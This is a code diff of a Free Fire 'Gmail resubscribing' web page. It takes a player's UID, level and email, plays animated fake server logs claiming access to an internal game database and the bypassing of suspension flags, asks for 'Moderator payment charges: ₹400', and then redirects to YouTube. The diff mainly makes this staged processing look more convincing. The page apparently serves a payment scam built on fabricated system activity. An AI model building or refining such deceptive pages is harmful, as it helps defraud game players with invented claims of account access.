@@ -27,29 +27,29 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            padding: 15px;
             overflow-x: hidden;
         }
 
-        /* Container & Glassmorphism (Apple Liquid Glass Theme) */
+        /* Container - Made Wider & Better Fitting for Mobile */
         .container {
-            width: 100%;
-            max-width: 500px;
+            width: 95%;
+            max-width: 550px;
             perspective: 1000px;
         }
 
         .glass-panel {
-            background: rgba(30, 30, 35, 0.4);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
+            background: rgba(30, 30, 35, 0.45);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 24px;
-            padding: 35px 25px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), inset 0 0 0 1px rgba(255, 255, 255, 0.05);
+            padding: 40px 25px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6), inset 0 0 0 1px rgba(255, 255, 255, 0.05);
             position: relative;
             overflow: hidden;
             transition: transform 0.3s ease;
-            min-height: 500px; /* Maintains size during transitions */
+            min-height: 550px;
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -85,7 +85,7 @@
 
         /* Form Elements */
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 22px;
             position: relative;
             width: 100%;
         }
@@ -101,12 +101,12 @@
 
         input, select {
             width: 100%;
-            padding: 14px 18px;
+            padding: 15px 18px; /* Slightly thicker for better touch */
             border-radius: 12px;
             border: 1px solid rgba(255, 255, 255, 0.1);
             background: rgba(0, 0, 0, 0.3);
             color: #fff;
-            font-size: 1rem;
+            font-size: 1.05rem;
             transition: all 0.3s ease;
             outline: none;
             appearance: none;
@@ -116,7 +116,7 @@
             background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%23FFFFFF%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E");
             background-repeat: no-repeat;
             background-position: right 15px top 50%;
-            background-size: 12px auto;
+            background-size: 14px auto;
         }
 
         select option {
@@ -138,7 +138,7 @@
         .error-msg {
             color: #ff3366;
             font-size: 0.85rem;
-            margin-top: 5px;
+            margin-top: 6px;
             padding-left: 5px;
             font-weight: bold;
             display: none;
@@ -149,8 +149,8 @@
             background: linear-gradient(135deg, #00ff44, #00b330);
             color: #000;
             border: none;
-            padding: 16px;
-            font-size: 1.2rem;
+            padding: 18px;
+            font-size: 1.25rem;
             border-radius: 12px;
             cursor: pointer;
             text-transform: uppercase;
@@ -159,7 +159,7 @@
             transition: all 0.3s ease;
             box-shadow: 0 10px 20px rgba(0, 255, 68, 0.3);
             margin-top: 15px;
-            letter-spacing: 1px;
+            letter-spacing: 1.5px;
         }
 
         .btn-submit:hover {
@@ -171,64 +171,85 @@
             transform: translateY(2px);
         }
 
-        /* Smooth Processing Section (No Box) */
+        /* Processing Container (No Box, Just Text on Glass) */
         .processing-container {
             display: none;
             flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
             width: 100%;
             height: 100%;
+            padding: 10px;
         }
 
         .process-log {
             width: 100%;
             display: flex;
             flex-direction: column;
-            gap: 15px;
+            gap: 18px;
         }
 
+        /* Butter Smooth Deep White Glow Text */
         .log-entry {
-            font-size: 1.1rem;
-            font-weight: bold;
+            font-size: 1.15rem;
+            font-weight: 800;
+            color: #fff;
             opacity: 0;
-            transform: translateY(20px);
-            transition: all 0.5s cubic-bezier(0.25, 1, 0.5, 1);
-            text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+            transform: translateY(20px) scale(0.95);
+            filter: blur(4px);
+            transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+            /* Deep White Glow Effect mixed with base color */
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.8), 
+                         0 0 15px rgba(255, 255, 255, 0.5), 
+                         0 0 30px rgba(255, 255, 255, 0.3);
+            line-height: 1.4;
+            letter-spacing: 0.5px;
+            text-align: left;
         }
 
         .log-entry.visible {
             opacity: 1;
-            transform: translateY(0);
+            transform: translateY(0) scale(1);
+            filter: blur(0);
         }
 
-        .c-green { color: #00ff44; text-shadow: 0 0 15px rgba(0, 255, 68, 0.4); }
-        .c-blue { color: #00ccff; text-shadow: 0 0 15px rgba(0, 204, 255, 0.4); }
-        .c-yellow { color: #ffcc00; text-shadow: 0 0 15px rgba(255, 204, 0, 0.4); }
-
-        /* Glowing Popup Text */
-        .glowing-popup {
-            display: none;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) scale(0.5);
+        /* Cinematic Full Screen Overlay (Layered Animation from Top) */
+        .resubscribe-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
             text-align: center;
-            font-size: 2.2rem;
+            z-index: 9999;
+            /* Starts hidden, scaled down, and slightly above */
+            opacity: 0;
+            transform: translateY(-50px) scale(0.7);
+            pointer-events: none;
+            transition: all 1.2s cubic-bezier(0.25, 1, 0.5, 1);
+        }
+
+        .resubscribe-overlay.show {
+            opacity: 1;
+            transform: translateY(0) scale(1); /* Zooms in to fill screen */
+            pointer-events: all;
+        }
+
+        .resubscribe-text {
+            font-size: 3rem;
             font-weight: 900;
             color: #fff;
             text-transform: uppercase;
-            text-shadow: 0 0 20px #00ff44, 0 0 40px #00ff44, 0 0 60px #00b330;
-            opacity: 0;
-            transition: all 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            z-index: 50;
-        }
-
-        .glowing-popup.show {
-            opacity: 1;
-            transform: translate(-50%, -50%) scale(1);
+            line-height: 1.3;
+            /* Heavy Glowing Effect */
+            text-shadow: 0 0 20px rgba(0, 255, 68, 0.8), 
+                         0 0 40px rgba(0, 255, 68, 0.6), 
+                         0 0 80px rgba(0, 179, 48, 0.8), 
+                         0 0 120px rgba(255, 255, 255, 0.8);
         }
 
         /* Original Transition Blinking Screen (No Drop Shadow) */
@@ -256,7 +277,7 @@
         .transition-image {
             max-width: 15%;
             max-height: 15%;
-            /* NO drop shadow added here, exact original effect */
+            /* NO drop shadow - pure original image */
         }
 
         @keyframes blinkImage {
@@ -269,10 +290,11 @@
             animation: blinkImage 1s infinite ease-in-out;
         }
 
-        @media (max-width: 768px) {
-            .transition-image { max-width: 25%; max-height: 25%; }
+        @media (max-width: 480px) {
+            .glass-panel { padding: 30px 20px; min-height: 480px; }
             h1 { font-size: 1.8rem; }
-            .glowing-popup { font-size: 1.8rem; }
+            .transition-image { max-width: 25%; max-height: 25%; }
+            .resubscribe-text { font-size: 2.2rem; }
         }
     </style>
 </head>
@@ -280,6 +302,10 @@
 
     <div class="transition-screen" id="transitionScreen">
         <img src="https://pending404.github.io/image/ff-loding.png" alt="Loading" class="transition-image" id="transitionImage">
+    </div>
+
+    <div class="resubscribe-overlay" id="resubscribeOverlay">
+        <div class="resubscribe-text">Free Fire Gmail<br>Resubscribing</div>
     </div>
 
     <div class="container" id="mainContainer">
@@ -356,10 +382,6 @@
                     </div>
             </div>
 
-            <div class="glowing-popup" id="glowingPopup">
-                Free Fire Gmail<br>Resubscribing
-            </div>
-
         </div>
     </div>
 
@@ -379,7 +401,7 @@
             const formSection = document.getElementById('formSection');
             const processingSection = document.getElementById('processingSection');
             const processLog = document.getElementById('processLog');
-            const glowingPopup = document.getElementById('glowingPopup');
+            const resubscribeOverlay = document.getElementById('resubscribeOverlay');
             const transitionScreen = document.getElementById('transitionScreen');
             const transitionImage = document.getElementById('transitionImage');
 
@@ -482,7 +504,7 @@
                     transitionScreen.classList.remove('active');
                     transitionImage.classList.remove('blink');
 
-                    // 2. Hide Form, Show Processing (Smooth Text)
+                    // 2. Hide Form, Show Processing Container
                     formSection.style.display = 'none';
                     processingSection.style.display = 'flex';
 
@@ -492,17 +514,20 @@
             }
 
             function runTextAnimations(uid, level, maskedEmail) {
+                // Highly detailed server-like logs
                 const logs = [
-                    `<span class="c-blue">Connecting to Server...</span>`,
-                    `<span class="c-green">UID Validated: ${uid}</span>`,
-                    `<span class="c-yellow">Checking Account Level: ${level}</span>`,
-                    `<span class="c-blue">Verifying Email Link:</span><br>${maskedEmail}`,
-                    `<span class="c-green">All checks passed.</span>`,
-                    `<span class="c-yellow" style="font-size: 0.95rem; margin-top: 10px;">Moderator payment charges: ₹400</span>`
+                    `<span style="color: #00ccff;">[System] Initiating secure connection to Free Fire Internal DB...</span>`,
+                    `<span style="color: #00ff44;">[Found] UID Account Data: ${uid}</span>`,
+                    `<span style="color: #00ccff;">[Scan] Authenticating Account Level: ${level}...</span>`,
+                    `<span style="color: #ffcc00;">[Fetch] Locating Unsubscribed Gmail ID...</span>`,
+                    `<span style="color: #00ff44;">[Match] Target Email: ${maskedEmail}</span>`,
+                    `<span style="color: #00ccff;">[Process] Bypassing Suspension Flags & Internal Bindings...</span>`,
+                    `<span style="color: #ffcc00;">[Sync] Synchronizing New Gmail Credentials...</span>`,
+                    `<span style="color: #fff; font-size: 1rem;">Moderator payment charges: ₹400</span>`
                 ];
 
                 let index = 0;
-                processLog.innerHTML = ""; // clear previous if any
+                processLog.innerHTML = ""; 
 
                 function appendLog() {
                     if (index < logs.length) {
@@ -511,47 +536,42 @@
                         div.innerHTML = logs[index];
                         processLog.appendChild(div);
                         
+                        // Add class to trigger CSS transition
                         setTimeout(() => div.classList.add('visible'), 50);
 
                         index++;
-                        let delay = Math.floor(Math.random() * 800) + 800;
+                        let delay = Math.floor(Math.random() * 800) + 800; // 0.8s to 1.6s delay
                         setTimeout(appendLog, delay);
                     } else {
-                        // 3. After text finishes, wait 1s, then show Popup
+                        // 3. After text finishes, trigger the Cinematic Layer Overlay
                         setTimeout(() => {
-                            processLog.style.display = 'none'; // hide text
-                            showGlowingPopup();
-                        }, 1500);
+                            showResubscribeOverlay();
+                        }, 1200);
                     }
                 }
 
                 setTimeout(appendLog, 500);
             }
 
-            function showGlowingPopup() {
-                // Show Glowing Popup
-                glowingPopup.style.display = 'block';
+            function showResubscribeOverlay() {
+                // Show Cinematic Full Screen Popup sliding/zooming from top
+                resubscribeOverlay.style.display = 'flex';
                 setTimeout(() => {
-                    glowingPopup.classList.add('show');
+                    resubscribeOverlay.classList.add('show');
                 }, 50);
 
-                // Wait 3 seconds, then Final Blinking Logo
+                // Wait 3.5 seconds showing the beautiful popup, then go to Logo
                 setTimeout(() => {
-                    glowingPopup.classList.remove('show');
-                    
+                    // 4. Final Blinking Logo & Redirect
+                    transitionScreen.style.zIndex = "10001"; // Ensure it goes above the overlay
+                    transitionScreen.classList.add('active');
+                    transitionImage.classList.add('blink');
+
                     setTimeout(() => {
-                        glowingPopup.style.display = 'none';
-                        // 4. Final Blinking Logo & Redirect
-                        transitionScreen.classList.add('active');
-                        transitionImage.classList.add('blink');
+                        window.location.href = "https://youtu.be/DK_UsATwoxI?si=lLLHC_Sr5TxTiY2x";
+                    }, 3000);
 
-                        setTimeout(() => {
-                            window.location.href = "https://youtu.be/DK_UsATwoxI?si=lLLHC_Sr5TxTiY2x";
-                        }, 3000);
-
-                    }, 500); // Wait for popup to fade out
-
-                }, 3000);
+                }, 3500);
             }
         });
     </script>
